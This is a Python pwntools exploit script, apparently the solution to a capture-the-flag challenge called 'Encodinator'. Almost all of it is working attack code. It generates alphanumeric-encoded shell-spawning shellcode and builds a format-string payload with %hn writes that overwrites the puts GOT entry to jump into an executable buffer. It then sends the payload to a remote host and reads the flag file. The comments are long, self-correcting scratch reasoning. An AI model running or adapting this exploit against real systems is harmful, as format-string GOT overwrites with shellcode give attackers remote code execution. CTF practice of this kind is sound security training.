from pwn import *
import base64
import sys
import os
import re

# Exploit script for Encodinator

# Configuration
BINARY = 'challenges/pwn/encodinator/files/dist/encodinator'
context.arch = 'amd64'
# context.draining = False

# We assume standard ELF binary offsets
PUTS_GOT = 0x403390
TARGET_BUFFER = 0x40000000 # Memory where encoded format string resides (RWX)

# Base85 Alphabet (for reference)
BASE85_ALPHABET = b"!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstu"
# We exclude `%` from shellcode generation to avoid triggering printf logic early
SAFE_CHARS = BASE85_ALPHABET.replace(b"%", b"").replace(b"n", b"").replace(b"$", b"").replace(b"\\", b"")
# Also exclude 'n' and '$' just in case? Or just '%'? % is the trigger.
# Actually % is sufficient. But 'n' is %n.
# Only % matters for start of format specifier. 

# Set up binutils path for Mac M1 cross-assembly
if os.path.exists('/opt/homebrew/bin/x86_64-elf-as'):
    os.environ['AS'] = '/opt/homebrew/bin/x86_64-elf-as'
    os.environ['LD'] = '/opt/homebrew/bin/x86_64-elf-ld'
    os.environ['OBJCOPY'] = '/opt/homebrew/bin/x86_64-elf-objcopy'
    # Need to tell pwntools to use these?
    # pwntools usually looks for 'as' in path, or triplet-as.
    # It tries 'x86_64-linux-gnu-as' etc.
    # We can add to PATH.
    os.environ['PATH'] = '/opt/homebrew/bin:' + os.environ['PATH']


def get_shellcode():
    try:
        # Pwntools context update
        context.clear(arch='amd64')
        sc = asm(shellcraft.sh())
        
        # Manually create avoid list: ALL bytes EXCEPT alphanumeric
        allowed = string.ascii_letters + string.digits
        bad_chars = bytes([b for b in range(256) if chr(b) not in allowed])
        
        # Use generic encoder with avoid list
        encoded_sc = encoders.encode(sc, avoid=bad_chars)
        
        return encoded_sc
    
    except Exception as e:
        log.warning(f"Shellcode generation failed: {e}")
        return b"A" * 40





def solve():
    # 1. Generate Shellcode
    sc = get_shellcode()
    # Ensure shellcode length is multiple of 5? No, total payload needs alignment.
    
    # 2. Add Padding to align to 8-byte boundary for addresses
    # Base85: 5 chars -> 4 bytes.
    # Format string arguments are 8 bytes.
    # We put Addresses at the END of buf.
    # buf is at stack offset 6 (Wait, verify this).
    # Let's say buf starts at Arg 6.
    # We have [DecodedSC].
    # EncodedSC is at start of format buffer.
    # printf prints EncodedSC.
    # Then it prints Format Payload.
    
    # Total Encoded String = EncodedSC + Padding + FormatPayload
    # We need FormatPayload to be aligned such that it can reference Addresses.
    # AND we need Addresses to be aligned on stack.
    
    # Let L_enc = len(EncodedSC).
    # We pad EncodedSC with spaces ' ' until some alignment?
    # No, we pad the *Decoded Input* to align the *Output*?
    # base85_encode(DecodedInput) -> EncodedString.
    
    # Wait, we control DecodedInput.
    # Let D_sc = DecodedInput(Shellcode).
    # We need D_sc to result in Shellcode.
    # shellcode = get_shellcode()
    
    # Constructing Input:
    # Input = D_sc + D_fmt + Addresses?
    # No.
    # Output = base85_encode(Input)
    # Output must contain Shellcode then Format String.
    # So Shellcode = Output_Part1
    # FormatString = Output_Part2
    
    # So Input = Decode(Shellcode + FormatString)
    # Then append Addresses to Input?
    # If we append Addresses to Input, they get encoded into Output_Part3.
    # FormatString must reference RAW Addresses.
    # But FormatString only sees arguments on STACK.
    # Stack contains `buf` (the Input).
    # So FormatString can see `buf`.
    # `buf` contains Input.
    # Input contains `Addresses`.
    # YES.
    
    # So Input = [Decode(Shellcode + FormatString)] [Addresses]
    # We need `Decode(Shellcode + FormatString)` to be multiple of 8 bytes?
    # So that `Addresses` starts at aligned stack offset.
    
    # Let's target alignment.
    # len(Decode(...)) should be multiple of 8.
    # Since Base85 5->4.
    # If len(Shellcode+Fmt) is multiple of 10, then Decode(...) is multiple of 8.
    
    # Format String Payload: 
    # Write 0x4000 to PUTS_GOT (low word).
    # Write 0x0000 to PUTS_GOT+2 (high word).
    # PUTS_GOT is 0x403390.
    # Target value is 0x40000000.
    # Puts@got -> 0x4000.
    
    # We are overwriting `puts` GOT entry.
    # Since partial overwrite of 0x7f... is risky?
    # No, we want 0x0000000040000000.
    # The existing value is 0x7ffff7...
    # So we need to overwrite 4 bytes? Or 8 bytes?
    # 0x0040000000 ? No 0x40000000.
    # existing: 0x00007ffff7...
    # We want: 0x0000000040...
    # So we need to write 4 bytes at least.
    # Writing 0 means large print?
    # Not necessarily.
    
    # Writes:
    # 1. 0x0000 at GOT+4 (Use %hn)
    # 2. 0x40000000 at GOT (Use %n or two %hn)
    # 0x40000000 is large.
    # Better:
    # Write 0x0000 at GOT+2.
    # Write 0x0000 at GOT+4.
    # Write 0x0000 at GOT+6.
    # Write 0x40000000 at GOT?
    # 0x40000000 = 1073741824. Takes a while to print.
    # We can split 0x40000000 into: 0x0000 (high) and 0x40000000 (low)?
    # Wait. 0x40000000 bits.
    # 0x4000 0000.
    # Low 16: 0x0000. High 16: 0x4000.
    # So:
    # At GOT: write 0x0000 (%hn).
    # At GOT+2: write 0x4000 (%hn).
    # At GOT+4: write 0x0000 (%hn).
    
    # We need 3 addresses in `Addresses` part of `buf`.
    # Addr1: GOT
    # Addr2: GOT+2
    # Addr3: GOT+4
    
    # Format String Construction:
    # Sc_len chars printed.
    # Need to print up to 0x4000 (16384) for second write.
    # Need to print 0 (0x10000) for first and third write?
    # Sequence:
    # 1. Write 0x4000 to GOT+2. (Val=16384).
    #    Printed: Sc_len. Padding: 16384 - Sc_len.
    # 2. Write 0x0000 to GOT. (Val=0 mod 65536).
    #    Printed: 16384. Padding: (65536 - 16384) = 49152.
    # 3. Write 0x0000 to GOT+4. (Val=0 mod 65536).
    #    Printed: 65536. Padding: 0.
    
    # Addresses needed on stack: GOT+2, GOT, GOT+4.
    
    # Calculate offset to addresses
    # We need to know len(EncodedSC + FormatString) to know where addresses start in buf.
    # Approach: Assume a fixed length for FormatString first, fill it, then pad to match.
    
    # Max length of format string ~ 50 chars?
    # %5c%XX$hn is ~8 chars. 3 writes = 24 chars.
    # Padding: we need input buf to be multiple of 8 bytes (so Encoded is multiple of 10 chars).
    
    # Step 1: Generate Shellcode
    sc = get_shellcode()
    
    # Step 2: Determine addresses
    # We write to GOT+2, GOT, GOT+4 to write 0x0000, 0x4000 (wait target is 0x40000000)
    # Target value: 0x40000000
    # High 16: 0x4000. Low 16: 0x0000.
    # Writing 0x4000 at GOT+2.
    # Writing 0x0000 at GOT.
    # Writing 0x0000 at GOT+4?
    # Wait, 0x40000000 is 64-bit: 00 00 00 00 40 00 00 00 (Little Endian)
    # So:
    # GOT:   00 (0x0000)
    # GOT+2: 00 (0x0000) -> NO! 0x40000000 is 0x4000 << 16? 
    # 0x40000000 = 1073741824.
    # Hex: 40 00 00 00.
    # Memory: 00 00 00 40 (Little Endian).
    # So:
    # GOT+0: 00 00
    # GOT+2: 00 40 -> 0x4000
    # GOT+4: 00 00
    # GOT+6: 00 00
    # Correct.
    
    # Address block (to be appended to input buffer)
    # We need pointers to GOT, GOT+2, GOT+4, GOT+6 (if we want to zero out everything)
    # Assuming upper bytes are already 0 from library address (0x00007f...).
    # 0x00007f... -> we need to zero out 0x7f...
    # So we DO need to write 0000 to GOT+4 and GOT+6.
    
    addresses_block = p64(PUTS_GOT) + p64(PUTS_GOT+2) + p64(PUTS_GOT+4) + p64(PUTS_GOT+6)
    
    # We have 4 writes.
    # 1. GOT: 0x0000
    # 2. GOT+2: 0x4000
    # 3. GOT+4: 0x0000
    # 4. GOT+6: 0x0000
    
    # Construct Format String
    # Shellcode prints len(sc) chars.
    current_printed = len(sc)
    
    # Write 1: 0x0000 to GOT. 
    # Needed: 0x10000 (65536) to wrap to 0.
    val1 = 0x0000
    pad1 = (val1 - current_printed) % 65536
    # if pad1 is 0, %0c is invalid? Standard printf handles %0c as valid? usually ignores or 0.
    # Better to ensure non-zero pad or use %...c
    pad1 += 65536 if pad1 < 8 else 0
    current_printed += pad1
    
    # Write 2: 0x4000 to GOT+2.
    val2 = 0x4000
    pad2 = (val2 - current_printed) % 65536
    pad2 += 65536 if pad2 < 8 else 0
    current_printed += pad2
    
    # Write 3: 0x0000 to GOT+4.
    val3 = 0x0000
    pad3 = (val3 - current_printed) % 65536
    pad3 += 65536 if pad3 < 8 else 0
    current_printed += pad3
    
    # Write 4: 0x0000 to GOT+6.
    val4 = 0x0000
    pad4 = (val4 - current_printed) % 65536
    pad4 += 65536 if pad4 < 8 else 0
    current_printed += pad4
    
    # Determine Offsets
    # Base offset (stack arg 7) = 6.
    # The addresses are at the end of the input buffer.
    # Input buffer = Decode(Shellcode + FmtString) + Addresses.
    # Let len(Decode(...)) be L_dec.
    # Addresses start at offset 6 + L_dec / 8.
    
    # We need L_dec to be multiple of 8.
    # This means len(Shellcode + FmtString) must be multiple of 10.
    
    # Let's target a specific length for FmtString to make calculations easy.
    # FmtString template: "%{p1}c%{o1}$hn%{p2}c%{o2}$hn%{p3}c%{o3}$hn%{p4}c%{o4}$hn"
    # We use placeholders for offsets first to estimate length.
    # Offsets will be roughly 6 + (200/8) = 31. Two digits.
    
    # Construct formatting part with explicit pads
    fmt_part = f"%{pad1}c%XX$hn%{pad2}c%YY$hn%{pad3}c%ZZ$hn%{pad4}c%WW$hn"
    
    # Now we need to pad fmt_part such that len(sc + fmt_part) % 10 == 0
    # And we replace XX, YY, ZZ, WW with actual offsets.
    
    # Iterative solution:
    # 1. Assume offsets are 2 digits (e.g. 10-99).
    # 2. Calculate length.
    # 3. Add padding chars (spaces) to fmt_part.
    # 4. Calculate L_dec.
    # 5. Calculate actual offsets.
    # 6. Verify offsets are 2 digits.
    
    # Assume offsets are placeholders XX=00..
    base_fmt = fmt_part.replace("XX", "00").replace("YY", "00").replace("ZZ", "00").replace("WW", "00")
    
    # Align
    total_len = len(sc) + len(base_fmt)
    rem = total_len % 10
    padding_needed = (10 - rem) % 10
    
    base_fmt += " " * padding_needed
    
    # Now valid length
    total_enc_len = len(sc) + len(base_fmt)
    l_dec = (total_enc_len // 5) * 4
    
    offset_start = 6 + (l_dec // 8)
    
    # Check if offsets fit in 2 digits
    # If offset_start is e.g. 50, then 50, 51, 52, 53 are 2 digits.
    # fine.
    
    final_fmt = fmt_part.replace("XX", str(offset_start)).replace("YY", str(offset_start+1))\
                        .replace("ZZ", str(offset_start+2)).replace("WW", str(offset_start+3))
    
    # Re-apply padding because replacing "XX" (2 chars) with "50" (2 chars) keeps length.
    # If offset is 1 digit (e.g. 9), length decreases.
    # But 6 + l_dec/8 likely > 9. (l_dec ~ 100 bytes -> 12. 6+12=18).
    # If offset > 99 (3 digits), length increases.
    # l_dec would be ~ 800 bytes. Shellcode ~ 40 bytes. Fmt ~ 50 bytes. Total < 200.
    # So offsets will be < 99.
    
    final_fmt += " " * padding_needed
    
    log.info(f"Final Format String: {final_fmt}")
    
    # Construct Payload
    full_encoded_target = sc + final_fmt.encode()
    
    # Decode
    try:
        input_payload = base64.a85decode(b"<~" + full_encoded_target + b"~>", adobe=True)
    except Exception as e:
        log.error(f"Decoding failed: {e}")
        return

    final_payload = input_payload + addresses_block
    
    if args.REMOTE:
        if len(sys.argv) < 4:
            log.error("Usage: python3 solve_encodinator.py REMOTE <HOST> <PORT>")
            return
        host = sys.argv[2]
        port = int(sys.argv[3])
        p = remote(host, port)
    else:
        # Since we can't run locally on ARM, we just print payload or skip
        # Logic allows calling via python3 solve.py REMOTE HOST PORT
        if len(sys.argv) > 1 and sys.argv[1] != 'REMOTE':
             # assume logic to run local?
             pass
        else:
             # Just print for verification if no args
             print(f"Payload Base64: {base64.b64encode(final_payload)}")
             return

    p.recvuntil(b"text: ")
    p.send(final_payload)
    
    # Automate fetching flag
    try:
        # Wait for shell to be spawned. 
        # We can send "echo shell_active" and wait for it to be sure.
        # But let's just send cat flag.txt
        p.clean()
        p.sendline(b"cat flag.txt")
        # Give it a moment or read until EOF
        # If shell is working, we should see flag content.
        print("Sent 'cat flag.txt', waiting for response...")
        resp = p.recvall(timeout=2)
        print(f"Response: {resp}")
        if b"CTF{" in resp:
            print(f"FLAG FOUND: {re.search(b'CTF{.*?}', resp).group(0).decode()}")
    except Exception as e:
        print(f"Interaction error: {e}")
        p.interactive()


if __name__ == "__main__":
    solve()
